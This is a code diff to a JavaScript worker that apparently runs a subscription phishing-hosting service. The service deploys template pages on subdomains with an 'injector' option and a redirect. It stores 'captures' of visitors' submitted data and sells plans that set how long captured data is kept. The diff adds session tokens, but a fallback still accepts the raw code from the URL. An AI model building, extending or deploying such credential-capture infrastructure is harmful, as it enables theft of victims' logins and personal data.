@@ -98,6 +98,11 @@ export default {
     if (url.pathname === '/api/auth/login' && request.method === 'POST') {
         return respond(await handleUserLogin(request, env));
     }
+
+    if (url.pathname === '/api/auth/settings' && request.method === 'POST') {
+        return respond(await handleUpdateSettings(request, env));
+    }
+
     if (url.pathname === '/api/auth/set-username' && request.method === 'POST') {
         return respond(await handleSetUsername(request, env));
     }
@@ -229,6 +234,28 @@ function extractBodyParts(html) {
 
 // --- HANDLERS ---
 
+async function verifySessionToken(request, env) {
+    const authHeader = request.headers.get('Authorization');
+    if (!authHeader || !authHeader.startsWith('Bearer ')) {
+        // Fallback to checking code in URL for backward compatibility during transition
+        const url = new URL(request.url);
+        const code = url.searchParams.get('code');
+        if(code) return code;
+        return null;
+    }
+
+    const token = authHeader.split(' ')[1];
+    const code = await env.SUBDOMAINS.get(`session::${token}`);
+
+    if (code) {
+        // Extend token life by 24h on use
+        await env.SUBDOMAINS.put(`session::${token}`, code, { expirationTtl: 86400 });
+    }
+
+    return code;
+}
+
+
 function getCorsHeaders(request) {
     const origin = request.headers.get('Origin');
     const allowedDomain = 'https://account-login.co.za';
@@ -292,6 +319,7 @@ async function handleSaveRequest(request, env) {
   }
 }
 
+
 async function handleCaptureRequest(request, env) {
   try {
     const body = await request.json();
@@ -300,13 +328,27 @@ async function handleCaptureRequest(request, env) {
     const uniqueCode = body.uniqueCode || 'default';
     const key = `capture::${uniqueCode}::${timestamp}::${uuid}`;
 
-    await env.SUBDOMAINS.put(key, JSON.stringify({ timestamp, data: body }));
+    // Get user retention policy
+    let ttl = 30 * 24 * 60 * 60; // Default 30 days
+    if (uniqueCode !== 'default') {
+        const user = await getUser(env, uniqueCode);
+        if (user.retentionDays) {
+            ttl = parseInt(user.retentionDays) * 24 * 60 * 60;
+        } else if (user.plan === 'free') {
+            ttl = 7 * 24 * 60 * 60; // 7 days for free
+        } else if (user.plan === 'gold') {
+            ttl = 90 * 24 * 60 * 60; // 90 days for gold unless overridden
+        }
+    }
+
+    await env.SUBDOMAINS.put(key, JSON.stringify({ timestamp, data: body }), { expirationTtl: ttl });
 
     return new Response(JSON.stringify({ success: true, key }), { headers: { 'Content-Type': 'application/json' } });
   } catch (err) {
     return jsonError(err.message, 500);
   }
 }
+
 
 async function handleGetCaptures(env) {
   try {
@@ -415,10 +457,18 @@ async function handleDeleteSite(request, env) {
     return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
 }
 
+
 async function handlePublicDeploy(request, env, rootDomain) {
     try {
         const body = await request.json();
         let { subdomain, uniqueCode, templateName, customHtml, enableInjector, redirectUrl } = body;
+
+        // Verify session matches the code being deployed for
+        const sessionCode = await verifySessionToken(request, env);
+        if(!sessionCode || sessionCode !== uniqueCode) {
+            return jsonError("Unauthorized: Session mismatch", 401);
+        }
+
 
         if (!subdomain || !uniqueCode) return jsonError("Missing subdomain or unique code");
         if (!/^[a-zA-Z0-9-]+$/.test(subdomain)) return jsonError("Invalid subdomain format");
@@ -558,10 +608,11 @@ ${head}
     }
 }
 
+
 async function handleGetPublicCaptures(request, env) {
-    const url = new URL(request.url);
-    const code = url.searchParams.get('code');
-    if (!code) return jsonError("Missing code");
+    const code = await verifySessionToken(request, env);
+    if (!code) return jsonError("Unauthorized: Invalid or expired session", 401);
+
 
     const user = await getUser(env, code);
     if (user.status === 'locked' || user.status === 'banned') {
@@ -624,13 +675,16 @@ async function handleGetPublicCaptures(request, env) {
             totalVisible: visibleKeys.length,
             totalPages: Math.ceil(visibleKeys.length / perPage)
         },
+
         total: totalCount,
         hidden: hiddenCount,
         plan: user.plan,
         username: user.username,
         activityLog: user.activityLog || [],
         pendingPlan: user.pendingPlan,
+        retentionDays: user.retentionDays || null,
         expiry: user.expiry,
+
         lastPayment: user.lastPaymentDate,
         siteCount: siteCount,
         sites: sites
@@ -928,6 +982,7 @@ async function handleUserRegister(request, env) {
     }
 }
 
+
 async function handleUserLogin(request, env) {
     try {
         const body = await request.json();
@@ -941,32 +996,32 @@ async function handleUserLogin(request, env) {
             code = password;
             if (!code) return jsonError("Missing code");
 
-            const user = await getUser(env, code);
-            // getUser returns a default object if not found, but we need to know if it REALLY exists for login
-            // actually getUser checks KV. If KV is null, it returns default.
-            // We should check raw KV to verify existence for login.
             const rawUser = await env.SUBDOMAINS.get(`user::${code}`);
             if (!rawUser) return jsonError("Invalid Code");
 
+            const user = JSON.parse(rawUser);
             if (!user.username) requiresUsername = true;
 
         } else {
             // Standard Login: Username + Password (Code)
             if (!username || !password) return jsonError("Missing credentials");
 
-            // Lookup Code from Username
             code = await env.SUBDOMAINS.get(`username::${username.toLowerCase()}`);
-            if (!code) return jsonError("Invalid Username or Password");
-
-            if (code !== password) return jsonError("Invalid Username or Password");
+            if (!code || code !== password) return jsonError("Invalid Username or Password");
         }
 
-        // Log Activity
+        // Generate a secure session token
+        const sessionToken = crypto.randomUUID();
+
+        // Save token in KV with 24 hour expiry
+        await env.SUBDOMAINS.put(`session::${sessionToken}`, code, { expirationTtl: 86400 });
+
         await logActivity(env, code, request, "Login");
 
         return new Response(JSON.stringify({
             success: true,
             code: code,
+            sessionToken: sessionToken,
             requiresUsername: requiresUsername
         }), { headers: { 'Content-Type': 'application/json' } });
 
@@ -974,6 +1029,7 @@ async function handleUserLogin(request, env) {
         return jsonError(e.message, 500);
     }
 }
+
 
 async function handleSetUsername(request, env) {
     try {
@@ -1209,3 +1265,23 @@ const CONFIG = {
     }
 })();
 `;
+
+
+async function handleUpdateSettings(request, env) {
+    try {
+        const code = await verifySessionToken(request, env);
+        if (!code) return jsonError("Unauthorized", 401);
+
+        const body = await request.json();
+        const user = await getUser(env, code);
+
+        if (body.retentionDays) {
+            user.retentionDays = parseInt(body.retentionDays);
+        }
+
+        await saveUser(env, code, user);
+        return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
+    } catch (e) {
+        return jsonError(e.message, 500);
+    }
+}
